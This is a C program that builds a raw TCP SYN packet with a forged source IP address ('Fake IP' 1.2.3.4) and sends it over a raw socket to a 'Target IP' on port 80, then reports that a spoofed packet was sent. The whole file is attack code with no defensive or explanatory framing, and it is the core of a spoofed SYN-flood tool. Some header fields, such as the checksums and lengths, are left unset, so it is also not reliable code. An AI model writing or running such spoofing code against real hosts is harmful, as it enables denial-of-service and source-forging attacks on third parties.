#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

struct iphdr *create_ip_header(char *packet) {
    struct iphdr *ip = (struct iphdr *)packet;
    ip->version = 4;
    ip->ihl = 5;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr("1.2.3.4");  // Fake IP
    ip->daddr = inet_addr("192.168.1.1"); // Target IP
    return ip;
}

struct tcphdr *create_tcp_header(char *packet) {
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    tcp->source = htons(1234);
    tcp->dest = htons(80);
    tcp->syn = 1; // SYN flag
    return tcp;
}

int main() {
    char packet[40];
    memset(packet, 0, sizeof(packet));

    struct iphdr *ip = create_ip_header(packet);
    struct tcphdr *tcp = create_tcp_header(packet);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    struct sockaddr_in dest = {AF_INET, htons(80), {inet_addr("192.168.1.1")}};

    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));

    printf("Spoofed TCP SYN packet sent!\n");
    return 0;
}

